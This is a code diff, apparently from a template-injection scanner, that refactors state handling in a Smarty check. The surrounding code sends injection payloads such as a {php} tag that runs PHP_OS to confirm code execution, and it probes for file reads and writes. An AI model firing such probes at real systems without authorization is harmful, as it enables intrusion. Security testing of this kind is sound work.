@@ -16,24 +16,24 @@ class Smarty(Check):
         
         self._check_reflection()
         
-        if not self.state.get('reflection'):
+        if not self.get('reflection'):
             return
             
         log.warn('Reflection detected')
         
         self._check_engine()
             
-        if not self.state.get('language') or  not self.state.get('engine'):
+        if not self.get('language') or  not self.get('engine'):
             return
             
         log.warn('Smarty engine detected')   
         
         self._check_os()
         
-        if self.state.get('exec'):
+        if self.get('exec'):
             log.warn(
                 'Shell command execution detected on \'%s\' operating system' % (
-                    self.state.get('os', 'undetected')
+                    self.get('os', 'undetected')
                 )
             )
         
@@ -45,7 +45,7 @@ class Smarty(Check):
         # Cannot access self:: when no class scope is active in smarty-3.1.21/libs/sysplugins/smarty_internal_templatebase.php(157) : eval()'d code on line 23
         
         #self._check_read()
-        #if self.state.get('read'):
+        #if self.get('read'):
         #    log.warn('Can ready arbitrary file')
         #self._check_write()
             
@@ -58,8 +58,8 @@ class Smarty(Check):
         expected = randA + randB
                 
         if expected == self.req(payload):
-            self.state['language'] = 'php'
-            self.state['engine'] = 'smarty-*'
+            self.set('language', 'php')
+            self.set('engine', 'smarty-*')
     
     def _check_reflection(self):
         
@@ -70,7 +70,7 @@ class Smarty(Check):
         expected = str(randA*randB)
         
         if expected == self.req(payload):
-            self.state['reflection'] = True
+            self.set('reflection', True)
         
     def _check_os(self):
         
@@ -81,13 +81,13 @@ class Smarty(Check):
         
         # If {php} is sent back means is in secure mode
         if '{php}' in result_php_tag:
-            self.state['engine'] = 'smarty-secured'
+            self.set('engine', 'smarty-secured')
         elif expected_rand == result_php_tag:
-            self.state['engine'] = 'smarty-unsecured'
-            self.state['exec'] = True
+            self.set('engine', 'smarty-unsecured')
+            self.set('exec', True)
     
             payload = """{php}echo PHP_OS;{/php}"""
-            self.state['os'] = self.req(payload)    
+            self.set('os', self.req(payload))
     
     def _check_read(self):
         
@@ -95,7 +95,7 @@ class Smarty(Check):
         result_proc_self_environ = self.req(payload)
         
         if 'PATH=' in result_proc_self_environ:
-            self.state['read'] = True
+            self.set('read', True)
             
     def _check_write(self):
         
@@ -112,6 +112,6 @@ class Smarty(Check):
         print requests.get(url) == '1', url, requests.get(url)
         
         if requests.get(url) == '1':
-            self.state['write'] = True
+            self.set('write', True)
         
         
